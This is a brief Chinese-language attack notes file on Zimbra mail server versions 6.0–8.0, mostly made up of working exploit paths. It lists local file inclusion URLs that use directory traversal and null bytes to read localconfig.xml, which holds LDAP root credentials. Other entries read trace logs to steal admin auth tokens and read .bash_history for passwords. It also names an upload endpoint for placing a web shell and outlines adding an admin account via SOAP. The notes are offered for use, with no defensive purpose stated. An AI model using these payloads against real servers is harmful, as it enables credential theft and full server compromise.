'''
zimbra
Version 6.0 7.0. 8.0
任意文件读取

默认日志路径
/var/log/zimbra.log
/opt/zimbra/jetty/logs/xxxx_xx_xx.trace.log%00

读session
添加cookie
bypass
'''

Zimbra Local File Inclusion
https://packetstormsecurity.com/files/124321/Zimbra-Local-File-Inclusion.html

任意文件读取
php.ini
httpd.conf


任意文件读取
/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00
/zimbraAdmin/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00


读取日志,获取当前登录的管理的AUTH_TOKEN
/zimbraAdmin/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/log/2016_05_05.trace.log

上传shell到download目录下
/service/extension/clientUploader/upload


获取authtoken获取方式
    读取ldap root账户,通过soap接口添加管理员账户
        /opt/zimbra/conf/localconfig.xml
    读取session,获取authtoken
        /opt/zimbra/log/2016_05_05.trace.log    好像要开启什么设置才有
        /opt/zimbra/.bash_history   这里有概率出现管理员密码






